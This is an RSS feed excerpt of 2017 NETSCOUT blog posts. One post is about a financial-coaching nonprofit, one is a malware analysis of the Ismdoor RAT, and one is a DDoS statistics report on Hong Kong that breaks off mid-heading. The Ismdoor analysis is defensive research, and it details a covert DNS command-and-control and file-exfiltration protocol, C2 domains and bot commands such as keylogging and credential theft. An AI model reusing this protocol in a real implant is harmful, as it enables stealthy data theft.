    <pubDate>Wed, 10 May 2017 16:52:22 -0400</pubDate>
    <source url="http://localhost:7996/de/full-blogs-2017.xml">NETSCOUT Blogs</source>
    <dc:creator>Michael Segal</dc:creator>
    </item>
<item>
  <title>NETSCOUT Mentorship in Action</title>
  <link>http://localhost:7996/blog/netscout-mentorship-action</link>
  <description>Balancing a checkbook. Managing credit card debt. Dealing with tax problems. Living within a budget. These are all personal finance issues many of us have faced at one time or another, but for some women, they can be overwhelming. And that’s where Budget Buddies is helping. Budget Buddies is a Massachusetts-based nonprofit organization that provides financial coaching for low...</description>
  <content:encoded><![CDATA[<p>Balancing a checkbook. Managing credit card debt. Dealing with tax problems. Living within a budget. These are all personal finance issues many of us have faced at one time or another, but for some women, they can be overwhelming. And that’s where Budget Buddies is helping.</p>

<p>Budget Buddies is a Massachusetts-based nonprofit organization that provides financial coaching for low-income women, enabling them to become more economically self-sufficient. This amazing program pairs personal financial coaches with women in need to teach them basic money-management skills. Over the six-month program, the coach and mentee (or “buddy”) attend Budget Buddies’ financial literacy classes together, and then meet to apply the lessons from the classes to specific financial issues or goals.</p>

<p>Catherine Jenkins is a Budget Buddies mentor and board president, when she’s not busy being an engineering manager at NETSCOUT. “The founding mothers of Budget Buddies, Anita and Kathy, saw a real need in the community where caseworkers weren’t able to help. Because personal finances are unique to each person, they felt one-on-one counseling would be the most effective approach. Through our program, we provide a personal coach who meets with a buddy on a weekly basis for six months, helping to empower them so they are better able to take care of their own finances,” stated Catherine.</p>

<p>NETSCOUT has long been a supporter of Budget Buddies. In addition to employees who serve as volunteer mentors and board members, NETSCOUT has donated computers and sponsored events.</p>

<p>Catherine explained that the women the program helps simply never learned the fundamental skills of managing personal finances. For many of them, this topic was never taught in the home and until only recently wasn’t taught in schools either. Budget Buddies provides this much needed education in a safe, one-on-one way, teaching women important skills such as how to handle credit cards, opening a bank account, comparison shopping, whether to buy on credit, how to negotiate a payment plan to pay off debt, etc.</p>

<p>“We offer counsel and education, but we’re also here to listen and be supportive in a very non-judgmental way. Budget Buddies coaches help women develop the skills and self-confidence to become financially independent. And because these skills are typically learned in the home, we believe we’re helping the next generation as well, as kids will now learn the importance of basic money-management from their mothers,” added Catherine.</p>

<p>Since Budget Buddies was first launched in 2010, the organization has implemented nearly 50 educational programs in partnership with 24 local community agencies and trained more than 375 coaches who mentor hundreds of women. Budget Buddies continues to grow, expanding to new communities across Massachusetts and into New Hampshire.</p>

<p>Helping women and making a real difference in their lives is a prime driver for many of the organization’s volunteers. “I’ve talked to women who’ve finished the program and it’s very heartening to see someone who started off looking intimidated, but now feels confident that they can take control of their finances. I’m proud to be able to help women who are less fortunate, and I’m proud to work for a company like NETSCOUT that cares about the community and is so supportive of its employees volunteering and giving back,” concluded Catherine.</p>

<p>To learn more about Budget Buddies, visit their&nbsp;<a href="https://budgetbuddies.org/" target="_blank">website</a>.</p>
]]></content:encoded>
    <category domain="http://localhost:7996/tags/category/community">Community</category>
    <enclosure url="http://localhost:7996/sites/default/files/blog_2.jpg" length="3876925" type="image/jpeg"/>
    <guid isPermaLink="false">41183657-ec5d-4f9f-a769-44d5325ebff3</guid>
    <pubDate>Wed, 03 May 2017 18:04:55 -0400</pubDate>
    <source url="http://localhost:7996/de/full-blogs-2017.xml">NETSCOUT Blogs</source>
    <dc:creator>NETSCOUT</dc:creator>
    </item>
<item>
  <title>Greenbug’s DNS-isms</title>
  <link>http://localhost:7996/blog/asert/greenbugs-dns-isms</link>
  <description>Over the past few months there has been a lot of research and press coverage on the Shamoon campaigns. These have been the attacks on Saudi Arabian companies where a destructive malware known as Disttrack was deployed. The malware, using stolen credentials, spreads throughout the targeted networks and then at a set date and time wipes the disks attached to the victim computers...</description>
  <content:encoded><![CDATA[<p>Over the past few months there has been a lot of research and press coverage on the Shamoon campaigns. These have been the attacks on Saudi Arabian companies where a destructive malware known as Disttrack was deployed. The malware, using stolen credentials, spreads throughout the targeted networks and then at a set date and time wipes the disks attached to the victim computers.</p>

<p>A big question kept coming up about Disttrack: how were the hardcoded credentials stolen in the first place? In January 2017, Symantec proposed one possible answer in their “<a href="https://community.broadcom.com/symantecenterprise/communities/community-home/librarydocuments/viewdocument?DocumentKey=dbb48763-8f17-49c7-8c09-813e97a62b37&amp;CommunityKey=1ecf5f55-9545-44d6-b0f4-4e4a7f5f5e68&amp;tab=librarydocuments">Greenbug cyberespionage group targeting Middle East, possible links to Shamoon</a>” blog post. In it they discuss a threat group they call Greenbug and a custom info-stealing remote access trojan (RAT) the group uses called Ismdoor. Symantec’s possible link between Greenbug and Shamoon is summed up with: “… the group compromised at least one administrator computer within a Shamoon-targeted organization’s network prior to W32.Disttrack.B being deployed on November 17, 2016. “ While there are few details about the threat group, there are even fewer details about the Ismdoor malware. Besides the brief description in the above blog, RSA released a <a href="https://community.rsa.com/community/products/netwitness/blog/2017/02/03/detecting-lsmdoor-variants-using-rsa-netwitness">post</a> in February 2017 giving an overview of its HTTP communications. <em>Update: Shortly before publication we found an additional February&nbsp; 2017 analysis of “<a href="https://www.nccgroup.trust/us/about-us/newsroom-and-events/blog/2017/february/ism-rat/">ISM RAT</a>” by NCC Group.</em></p>

<p>Although analysis has been slow, Ismdoor development has been quick! One major change in recent versions has been the replacement of the old HTTP based command and control (C2) functionality with a custom covert channel using AAAA DNS queries for IPv6 addresses. There are a lot of moving packets to this new mechanism so this post takes a look at our analysis of it so far.</p>

<p><strong>Samples</strong></p>

<p>The first sample used in this post is available on <a href="https://www.virustotal.com/en/file/29c76f2115bcb3a92aeeedf3368f6ce94a420cd6d88fd5e4b7c37b51f2768c08/analysis/">VirusTotal</a>. It caught our attention due to the descriptive debug string:</p>

<pre>
<strong>C:\Projects\DNS BOT\Bot\x64\Release\Ism.pdb</strong></pre>

<p>This is version 1.0.3 and was compiled on 2016-11-11. It was first seen on VirusTotal on 2017-03-27 and was submitted from Saudi Arabia. The C2 domains for this sample are:</p>

<ul>
	<li>winrepp[.]com</li>
	<li>winsecupdater[.]com</li>
</ul>

<p>They were registered on 2016-06-09 and 2016-11-06. Since the C2s were down at the time of this research, we searched for and found a <a href="https://www.virustotal.com/en/file/5bc0a1f33c982916c8085076e8898ddbe8726249867b47df02e58ac3bf466b27/analysis/">newer sample</a> via this <a href="https://twitter.com/xdxdxdxdoa/status/849628403775008768">tweet</a>. This sample also has a descriptive debug string:</p>

<pre>
<strong>C:\Users\me\Documents\Visual Studio 2013\Projects\DNS_Bot\v 10.0.19\x64\Release\Nrtscan.pdb</strong></pre>

<p>It is version 1.0.19 and was compiled (and first submitted to VirusTotal) on 2017-04-05. Again, it was submitted from Saudi Arabia. The C2 domains for this sample were registered on 2016-12-04 and will be discussed next.</p>

<p><strong>Malware Configuration</strong></p>

<p>Ismdoor has an encrypted configuration that contains a primary and secondary C2 domain, various identifiers, timeouts, and flags. These values can be updated by later C2 commands. A substitution cipher is used to decrypt the configuration when it is needed. The character mapping has been consistent across samples and we have made available a Python snippet of it on <a href="https://github.com/tildedennis/malware/blob/master/ismdoor/decrypt_c2.py">Github</a>. The initial configuration for the analyzed sample looks like this:</p>

<pre>
<strong>.dnslookupdater[.]com (primary C2 domain)
 30 (alive timeout)
 -1 (appId)
 0
 -1
 0
 0
 .dnssecupdater[.]com (secondary C2 domain)
 0
 0
 20000
 00000000-0000-0000-0000-000000000000 (uniqueId)</strong></pre>

<p>&nbsp;</p>

<p><strong>Command and Control</strong></p>

<p>The C2 mechanism is built on top of DNS and can be separated into three layers: DNS, transport/session, and C2 messages.</p>

<p><strong>DNS Layer</strong></p>

<p>All data sent between the bot and the C2 is done using AAAA DNS UDP queries. Data to the C2 is via specially crafted query names and data from the C2 is returned via IPv6 addresses. The bot side of the connection drives all communications. An example query and response looks like this:</p>

<p><a href="http://asert.arbornetworks.com/greenbugs-dns-isms/dns/" rel="attachment wp-att-8967"><img alt="" class="alignnone size-large wp-image-8967" height="367" src="https://www.netscout.com/sites/default/files/asert-blog/uploads/2017/05/dns-1024x418.png" width="900" /></a></p>

<p><strong>Transport/Session Layer</strong></p>

<p>The next layer up can be thought of as a transport/session layer (think similar to UDP and TCP). Here, communications are divided up into sessions and most sessions consist of at least five DNS requests and replies:</p>

<ol>
	<li>Establish session ID</li>
	<li>Send messages to C2</li>
	<li>Send message count to the C2</li>
	<li>Ask for count of response messages from the C2</li>
	<li>Receive messages from the C2</li>
</ol>

<p>An example of this typical session looks like this:</p>

<p><a href="http://asert.arbornetworks.com/greenbugs-dns-isms/session/" rel="attachment wp-att-8968"><img alt="" class="alignnone size-large wp-image-8968" height="75" src="https://www.netscout.com/sites/default/files/asert-blog/uploads/2017/05/session-1024x85.png" width="900" /></a></p>

<p>To establish a session, the bot generates a session ID (32 uppercase hexadecimal characters) and sends it to the C2 using a query name of the following format:</p>

<pre>
<strong>n.n.c.&lt;session id&gt;.c2.com</strong></pre>

<p>Here is the example from the above screenshot:</p>

<pre>
<strong>n.n.c.237735C7DCF34DE59F8E04CB852401B3.dnslookupdater[.]com</strong></pre>

<p>The C2 will respond with a static IPv6 address of:</p>

<pre>
<strong>a67d:db8:a2a1:7334:7654:4325:370:2aa3</strong></pre>

<p>Next, the bot sends upper layer C2 messages (described in the next section) to the C2 using query names formatted like this:</p>

<pre>
<strong>&lt;encoded message&gt;.&lt;message number&gt;.dr.&lt;session id&gt;.c2.com</strong></pre>

<p>Here is the example from above:</p>

<pre>
<strong>TTpDQz8!.0.dr.237735C7DCF34DE59F8E04CB852401B3.dnslookupdater[.]com</strong></pre>

<p>Message numbers start at zero and messages are base64 encoded with the following characters changed:</p>

<ul>
	<li>= -&gt; !</li>
	<li>/ -&gt; &amp;</li>
	<li>+ -&gt; @</li>
</ul>

<p>The above decodes to the following:</p>

<pre>
<strong>M:CC?</strong></pre>

<p>Again, the C2 responds with a static but different, IPv6 address:</p>

<pre>
<strong>a67d:db8:85a3:4325:7654:8a2a:370:7334</strong></pre>

<p>In the third step the bot sends a sent message count to the C2 using the following format:</p>

<pre>
<strong>n.&lt;message count&gt;.f.&lt;session id&gt;.c2.com</strong></pre>

<p>For example:</p>

<pre>
<strong>n.1.f.237735C7DCF34DE59F8E04CB852401B3.dnslookupdater[.]com</strong></pre>

<p>Here, the C2 responds with an address of hex encoded characters, namely all space characters:</p>

<pre>
<strong>2020:2020:2020:2020:2020:2020:2020:2020</strong></pre>

<p>The fourth step has the bot asking the C2 how many messages it should expect from it. These requests are formatted liked this:</p>

<pre>
<strong>n.n.fc.&lt;session id&gt;.c2.com</strong></pre>

<p>It looks like this for our example session:</p>

<pre>
<strong>n.n.fc.237735C7DCF34DE59F8E04CB852401B3.dnslookupdater[.]com</strong></pre>

<p>For this exchange the C2 responds with an IPv6 address that is static except for the last eight bytes of the address, which are used for the message count. For example if the C2 is going to send one message to the bot it will respond like this:</p>

<pre>
<strong>a67d:db8:85a3:4325:7654:8a2a::1</strong></pre>

<p>The final step involves the bot receiving messages from the C2. It indicates which message it wants to receive with query names like:</p>

<pre>
<strong>www.&lt;message number&gt;.s.&lt;session id&gt;.c2.com</strong></pre>

<p>Message numbers are again zero based, so to receive the first message of this example session the bot will send:</p>

<pre>
<strong>www.0.s.237735C7DCF34DE59F8E04CB852401B3.dnslookupdater[.]co</strong>m</pre>

<p>The C2 responds with addresses containing the hex encoded messages like this:</p>

<pre>
<strong>4f6b:2020:2020:2020:2020:2020:2020:2020</strong></pre>

<p>This decodes to “Ok&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; “. To help analyze these sessions we wrote a parser in Python available on <a href="https://github.com/tildedennis/malware/blob/master/ismdoor/parse_dns.py">Github</a>. Using the parser, the above session can be visualized like this:</p>

<pre>
<strong>session #0
session id: 237735C7DCF34DE59F8E04CB852401B3
send msg 0 to c2: M:CC?
sent 1 msgs to c2
expecting 1 msgs from c2
recv msg 0 from c2: 4F6B2020202020202020202020202020 (Ok&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; )</strong></pre>

<p>When larger amounts of data need to be transferred (for file upload and download) a different type of session is used:</p>

<ol>
	<li>Send file message count to the C2</li>
	<li>Send file messages to C2</li>
	<li>Periodically ask the C2 if it is missing any sent file messages</li>
	<li>Resend any missed file messages</li>
</ol>

<p>For file transfers, the file message count is sent to the C2 using query names formatted like this:</p>

<pre>
<strong>n.&lt;message count&gt;.&lt;session id&gt;.c2.com</strong></pre>

<p>Session IDs are derived from the C2 commands that requested the file transfer. The C2 responds with a static IPv6 address:</p>

<pre>
<strong>a67d:db8:a2a1:7334:7654:4325:370:2aa3</strong></pre>

<p>File messages are then sent using the following types of query names:</p>

<pre>
<strong>&lt;encoded data&gt;.&lt;message number&gt;.d.&lt;session id&gt;.c2.com</strong></pre>

<p>Message numbers start at zero and data is encoded as above. The C2 will either not respond to these data message or send a DNS “Server failure” error response. Periodically the bot asks the C2 if it has missed any file messages using the following query:</p>

<pre>
<strong>uff&lt;message count&gt;.&lt;message count&gt;.&lt;session.id&gt;.c2.com</strong></pre>

<p>Here, the C2 responds with an address of hex encoded space characters. The bot then sends the following queries, as described above, to receive an answer from the C2:</p>

<pre>
<strong>n.n.fc.&lt;session id&gt;.c2.com
www.&lt;message number&gt;.s.&lt;session id&gt;.c2.com</strong></pre>

<p>The C2 then responds with a hex encoded list of missed messages. For example if the C2 were missing message numbers 5, 9, 15, and 16 it would send this IPv6 address:</p>

<pre>
<strong>3136:2c31:352c:392c:3520:2020:2020:2020</strong></pre>

<p>which decodes to: “(16,15,9,5&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; )”. Missing file messages are resent with query names like:</p>

<pre>
&lt;encoded data&gt;.&lt;message number&gt;.dl.&lt;session id&gt;.c2.com</pre>

<p>As with the send file message above, the C2 will either not respond to these replays or send an error message. A parsed example of this type of session looks like this:</p>

<pre>
<strong>session #13
session id: a1a13274c08f4730b88f1715de38068c
send file msg count (25) to c2
send file msg 0 to c2
send file msg 1 to c2
...
send file msg 24 to c2
ask c2 for missing file msgs
expecting 1 msgs from c2
recv msg 0 from c2: 31362C31352C392C3520202020202020 (16,15,9,5&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; )&nbsp;&nbsp;
resending file msg 16 to c2
...</strong></pre>

<p><strong>C2 Messages</strong></p>

<p>The third layer contains C2 messages and there are at least eight of them. Some messages have additional parameters. We’ll go through each message and show some examples using the above parser.</p>

<p><strong>M:CC?</strong></p>

<p>“CC” likely means “Connection Check” or “Check Connection”. This is a periodic message that checks whether the C2 server is alive and well. An example message and response looks like this:</p>

<pre>
<strong>send msg 0 to c2: M:CC?
recv msg 0 from c2: 4F6B2020202020202020202020202020 (Ok&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; )</strong></pre>

<p><strong>M:ME?</strong> “ME” likely means “Message” and these are used to send status messages back to the C2. Here is an example:</p>

<pre>
<strong>send msg 0 to c2: M:ME?appId=-1&amp;message=Executed Successfully
recv msg 0 from c2: 20202020202020202020202020202020 (&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; )</strong></pre>

<p><strong>M:AV?</strong> “AV” may mean “AliVe” or “AVailable". This is a periodic message that has two purposes. The first is to initialize two identifiers (stored in the previously mentioned config) “appId” and “uniqueId”. The latter is akin to a bot ID, but it is unclear what the former represents. It changes on each malware run and tends to be a low value integer (some examples seen: 5, 8, 11, 12). An example of this message looks like:</p>

<pre>
<strong>send msg 0 to c2: M:AV?appId=-1&amp;uniqueId=00000000-0000-0000-000
send msg 1 to c2: 0-000000000000
recv msg 0 from c2: 41707049647C7C7C38267569643D3432 (AppId|||8&amp;uid=42)
recv msg 1 from c2: 6435623934352D383062362D34336430 (d5b945-80b6-43d0)
recv msg 2 from c2: 2D396330332D33323736316233323866 (-9c03-32761b328f)
recv msg 3 from c2: 34372020202020202020202020202020 (47&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; )</strong></pre>

<p>After the IDs have been initialized this message asks how many commands are available for the bot on the C2. These messages look like:</p>

<pre>
<strong>send msg 0 to c2: M:AV?appId=8&amp;uniqueId=42d5b945-80b6-43d0-9c03
send msg 1 to c2: -32761b328f47
recv msg 0 from c2: 31202020202020202020202020202020 (1&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; &nbsp;&nbsp;&nbsp;)</strong></pre>

<p><strong>M:ReId?</strong></p>

<p>“ReId” may mean “ReplyID” and verifies the appId with the C2 after it is initialized above:</p>

<pre>
<strong>send msg 0 to c2: M:ReId?Id=8
recv msg 0 from c2: 4F6B2020202020202020202020202020 (Ok&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; )</strong></pre>

<p><strong>M:GAC?</strong></p>

<p>“GAC” likely means “Get A Command” and that’s what it does:</p>

<pre>
<strong>send msg 0 to c2: M:GAC?appId=8
recv msg 0 from c2: 30323064373461352D323061332D3433 (020d74a5-20a3-43)
recv msg 1 from c2: 65372D616463642D6634383631356466 (e7-adcd-f48615df)
recv msg 2 from c2: 356137347C7C7C476574436F6E666967 (5a74|||GetConfig)
recv msg 3 from c2: 3A3A3A31302020202020202020202020 (:::10&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; )</strong></pre>

<p>Bot commands will be discussed in a later section, but one thing to notice is that each command contains a unique GUID (020d74a5-20a3-43e7-adcd-f48615df5a74 in this example).</p>

<p><strong>M:CR?</strong></p>

<p>“CR” likely means “Command Received” and it acknowledges receipt of a command:</p>

<pre>
<strong>send msg 0 to c2: M:CR?cd=020d74a5-20a3-43e7-adcd-f48615df5a74
recv msg 0 from c2: 4F6B2020202020202020202020202020 (Ok&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; )</strong></pre>

<p>Notice the command GUID is returned to the C2.</p>

<p><strong>M:SF?</strong></p>

<p>“SF” likely means “Send File” and is used to send files and command results. Here is the result of the GetConfig command from above:</p>

<pre>
<strong>send msg 0 to c2: M:SF?commandId=CmdResult=020d74a5-20a3-43e7-a
send msg 1 to c2: dcd-f48615df5a74|||GetConfig:::.dnslookupdate
send msg 2 to c2: r[.]com^M
30^M
8^M
1^M
-1^M
0^M
0^M
.dnssecupdater[.]com
send msg 3 to c2: ^M
0^M
0^M
20000^M
42d5b945-80b6-43d0-9c03-32761b
send msg 4 to c2: 328f47
recv msg 0 from c2: 20202020202020202020202020202020 (&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; )</strong></pre>

<p><strong>M:GF?</strong></p>

<p>“GF” likely means “Get File” and is similar to “Send File” To see more of what Ismdoor’s DNS C2 protocol and messages look like, we’ve put up a parsed PCAP from an infected VM up on <a href="https://github.com/tildedennis/malware/blob/master/ismdoor/parsed_dns_comms.txt">Github</a>.</p>

<p><strong>Bot Commands</strong></p>

<p>Ismdoor has a bunch of functionality and commands. While this post won’t go into detail on them, most are self-describing:</p>

<ul>
	<li>ChangeAliveSeconds – sets alive timeout in config</li>
	<li>ChangeAddress – sets C2 domains in config</li>
	<li>SI – likely means “System Information” – runs a bunch of system commands and sends their output to the C2</li>
	<li>GetConfig - sends config to C2</li>
	<li>RunNewVersion - updates self</li>
	<li>restart - restarts self</li>
	<li>remove - removes self</li>
	<li>CreateMimi1Bat - likely executes Mimikatz (executes PowerShell scripts: ccd61.ps1 and Invoke-bypassuac)</li>
	<li>RAAD – executes PowerShell scripts ivb.ps1 and Invoke-EventVwrBypass</li>
	<li>CLRAD - deletes files associated with RAAD command</li>
	<li>ExecutePC - likely executes Powercat—PowerShell version of Netcat (executes PowerShell scripts dp.ps1 and powercat)</li>
	<li>FastAlive - sets “FastAlive” in config. Unknown ramifications</li>
	<li>ExecuteKL - likely executes a keylogger (executes Winit.exe and sends "Start Keylog Done" message back to the C2)</li>
	<li>RemoveKL - kills and removes keylogger associated files</li>
	<li>GetVersion - sends malware version to C2</li>
	<li>PauseUpload</li>
	<li>ResumeUpload</li>
	<li>PauseDownload</li>
	<li>ResumeDownload</li>
	<li>PWS - takes a screenshot</li>
	<li>ImmediateResetRam - sets “ResetRam” flag in config. Unsure of the ramifications</li>
	<li>DownloadFile</li>
	<li>UploadFile</li>
</ul>

<p>If a command doesn’t match a predefined one, it passes it to a command shell and returns the result as a file.</p>

<p><strong>Conclusion</strong></p>

<p>While a definitive connection between Greenbug’s Ismdoor and the Shamoon campaigns is still up in the air, we wanted to highlight some notes in its favor:</p>

<ul>
	<li>Symantec saw an earlier version of Ismdoor on a Shamoon targeted host shortly before a Disttrack attack (unverified by Arbor)</li>
	<li>All the known samples of the DNS variant of Ismdoor have been originally submitted to VirusTotal from Saudi Arabia</li>
	<li>The DNS variant of Ismdoor has explicit capabilities for stealing credentials via its CreateMimi1Bat and ExecuteKL commands</li>
	<li>Pivoting on the CreateMimi1Bat command’s PowerShell script name (ccd61.ps1) leads to a Shamoon related blog post by McAfee [9] where they trace a malicious, macro laden spearfishing email to the download and execution of an earlier version of Ismdoor (though they don’t name the malware they’re describing)</li>
</ul>

<p>What is definite though is that Ismdoor is active and under development. This post takes a close look at one of its major new features: a full featured C2 mechanism that uses DNS.</p>
]]></content:encoded>
    <category domain="http://localhost:7996/tags/blog-category/asert">ASERT</category>
    <enclosure url="http://localhost:7996/sites/default/files/PrayingMantis_2-1024x783.png" length="437214" type="image/png"/>
    <guid isPermaLink="false">382e8114-3ede-4e66-bc29-2f101bcd57ae</guid>
    <pubDate>Mon, 01 May 2017 11:55:37 -0400</pubDate>
    <source url="http://localhost:7996/de/full-blogs-2017.xml">NETSCOUT Blogs</source>
    <dc:creator>ASERT Team</dc:creator>
    </item>
<item>
  <title>Observed Spike in DDoS Attacks Targeting Hong Kong</title>
  <link>http://localhost:7996/blog/asert/observed-spike-ddos-attacks-targeting-hong-kong</link>
  <description>Introduction Each week ASERT produces a weekly threat intelligence bulletin for Arbor customers. In addition to providing insights into the week's security news and reviewing ASERT's threat research activities, we also summarize the weeks DDoS attack data as reported by over 330 global Internet Service Providers that share anonymized traffic statistics and DDoS event data. Here...</description>
  <content:encoded><![CDATA[<h2>Introduction</h2>

<p>Each week ASERT produces a weekly threat intelligence bulletin for Arbor customers. In addition to providing insights into the week's security news and reviewing ASERT's threat research activities, we also summarize the weeks DDoS attack data as reported by over 330 global Internet Service Providers that share anonymized traffic statistics and DDoS event data. Here's a snippet of the DDoS statistics from the week ending March 23rd: [caption id="attachment_8950" align="aligncenter" width="644"]<a href="http://www.netscout.com/sites/default/files/asert-blog/uploads/2017/04/KSoluk-HKDDoS-Pic1-DDoSStatsForWeekEndingMarch23rd.png"><img alt="" class="wp-image-8950 size-full" height="220" src="https://www.netscout.com/sites/default/files/asert-blog/uploads/2017/04/KSoluk-HKDDoS-Pic1-DDoSStatsForWeekEndingMarch23rd.png" width="644" /></a> DDoS Statistics from ASERT's Weekly Threat Bulletin of March 23rd.[/caption] Normally, week after week, you can count on the U.S. being the top destination country for DDoS attacks. However, recently we observed a bit of an anomaly. For the two weeks ending April 6th and April 13th, Hong Kong was the top destination country for attacks greater than 10 Gbps in size: [caption id="attachment_8949" align="aligncenter" width="650"]<a href="http://www.netscout.com/sites/default/files/asert-blog/uploads/2017/04/KSoluk-HKDDoS-Pic2-DDoSStatsForWeekEndingApril13th.png"><img alt="" class="wp-image-8949 size-full" height="220" src="https://www.netscout.com/sites/default/files/asert-blog/uploads/2017/04/KSoluk-HKDDoS-Pic2-DDoSStatsForWeekEndingApril13th.png" width="650" /></a> DDoS Statistics from ASERT's Weekly Threat Bulletin of April 13th[/caption] Security folks love anomalies so we decided to look at DDoS attacks targeting Hong Kong for the past month to see if anything stood out from a DDoS attack perspective.</p>

<h2>Attack Frequency and Size</h2>

<p>As illustrated in the chart below, it is clear that between April 1st and April 8th, Hong Kong received more than its normal share of DDoS attacks peaking out at 909 reported attacks on April 3rd. [caption id="attachment_8948" align="aligncenter" width="975"]<a href="http://www.netscout.com/sites/default/files/asert-blog/uploads/2017/04/KSoluk-HKDDoS-Pic3-FrequencyOfAttacks.png"><img alt="" class="wp-image-8948 size-full" height="359" src="https://www.netscout.com/sites/default/files/asert-blog/uploads/2017/04/KSoluk-HKDDoS-Pic3-FrequencyOfAttacks.png" width="975" /></a> Number of Attacks per Day Targeting Hong Kong between March 15th and April 14th[/caption] The following table lists the average number of attacks per day for the graphed periods prior to April 1st and after April 8th: <a href="http://www.netscout.com/sites/default/files/asert-blog/uploads/2017/04/KSoluk-HKDDoS-Table1-AverageNumberOfAttacksPerDay-BeforeDuringAfter.png"><img alt="" class="wp-image-8942 aligncenter" height="93" src="https://www.netscout.com/sites/default/files/asert-blog/uploads/2017/04/KSoluk-HKDDoS-Table1-AverageNumberOfAttacksPerDay-BeforeDuringAfter.png" width="509" /></a> In short, the first 8 days in April saw a 67% increase in the <em>number</em> of attacks compared to "normal" (where normal, in this case, is defined by attack data from the prior 29 days and the following 6 days). The following table illustrates that the average attack <em>size</em> did not significantly deviate during the April 1st through April 8th timeframe. <a href="http://www.netscout.com/sites/default/files/asert-blog/uploads/2017/04/KSoluk-HKDDoS-Table2-AverageAttackSize-BeforeDuringAfter.png"><img alt="" class="wp-image-8941 aligncenter" height="83" src="https://www.netscout.com/sites/default/files/asert-blog/uploads/2017/04/KSoluk-HKDDoS-Table2-AverageAttackSize-BeforeDuringAfter.png" width="429" /></a> In fact, the average attack size between April 1st and April 8th slightly decreased compared to the prior 29 days. However, since there were a lot more of these attacks, we observe the following cumulative daily attack bandwidth whereupon Hong Kong took on a peak aggregate 5.841 Tbps of attack traffic on April 2nd: [caption id="attachment_8947" align="alignnone" width="975"]<a href="http://www.netscout.com/sites/default/files/asert-blog/uploads/2017/04/KSoluk-HKDDoS-Pic4-CummulativeSizeOfAttacks.png"><img alt="" class="wp-image-8947 size-full" height="359" src="https://www.netscout.com/sites/default/files/asert-blog/uploads/2017/04/KSoluk-HKDDoS-Pic4-CummulativeSizeOfAttacks.png" width="975" /></a> Cumulative Daily Attack Bandwidth Targeting Hong Kong between March 15th and April 14th[/caption]</p>

<h2>Attack Types</h2>

<p>UDP-based reflection/amplification attacks and TCP SYN attacks both featured prominently in the April 1st through April 8th attacks targeting Hong Kong. Of the 6,827 total attacks reported, 40% (2,723) provided a protocol and source port. Of these, 32% (876) contained an NTP reflection/amplification component (i.e. from UDP/123); 17% (455) contained an SSDP reflection/amplification component (i.e. from UDP/1900), 7% (184) contained a DNS reflection/amplification component, and 32% (879) contained a TCP SYN component: [caption id="attachment_8946" align="aligncenter" width="898"]<a href="http://www.netscout.com/sites/default/files/asert-blog/uploads/2017/04/KSoluk-HKDDoS-Pic5-AttackTypes.png"><img alt="" class="wp-image-8946 size-full" height="667" src="https://www.netscout.com/sites/default/files/asert-blog/uploads/2017/04/KSoluk-HKDDoS-Pic5-AttackTypes.png" width="898" /></a> Breakdown of Attack Types between April 1st and April 8th for Attacks with known Source Ports[/caption] It should be noted that most of the reported attacks consisted of more than one attack type. For example, only 101 (12%) of the 876 attacks that contained an NTP reflection/amplification component contained <strong>only</strong> an NTP reflection component. In other words, the attacks were "blended". On the receiving end, TCP/80, UDP/80, or both were reported as a destination port in 49% of the attacks where destination ports were provided.</p>

<h2>Source Country Breakdown</h2>

<p>The following table lists the top 3 reported source countries for attacks that were sourced solely from a single country: [caption id="attachment_8940" align="aligncenter" width="384"]<a href="http://www.netscout.com/sites/default/files/asert-blog/uploads/2017/04/KSoluk-HKDDoS-Table3-TopSourceCountries.png"><img alt="" class="wp-image-8940" height="123" src="https://www.netscout.com/sites/default/files/asert-blog/uploads/2017/04/KSoluk-HKDDoS-Table3-TopSourceCountries.png" width="384" /></a> Source Countries for Attacks between April 1st and April 8th[/caption] Of course, geo-location needs to be taken in appropriate context, particularly for spoofed attacks such as UDP-based reflection/amplification attacks. In the case of a UDP reflection/amplification attack, the attacker can be geographically situated anywhere and simply bounces (reflects) the attack off of poorly configured NTP, DNS, SSDP, etc. servers that can also be located anywhere. The following graphic illustrates this concept. In this case, an attacker in the U.S. launches a DDoS attack against a victim in Hong Kong using NTP servers located in China. All the victim in Hong Kong sees is traffic coming from China: [caption id="attachment_8945" align="aligncenter" width="975"]<a href="http://www.netscout.com/sites/default/files/asert-blog/uploads/2017/04/KSoluk-HKDDoS-Pic6-NTPReflectionAmplification.png"><img alt="" class="wp-image-8945 size-full" height="666" src="https://www.netscout.com/sites/default/files/asert-blog/uploads/2017/04/KSoluk-HKDDoS-Pic6-NTPReflectionAmplification.png" width="975" /></a> Illustration of an NTP-based UDP Reflection/Amplification Attack[/caption] We need to keep in mind that the Internet is global and attackers will use any globally available resources to attack.</p>

<h2>Target Analysis</h2>

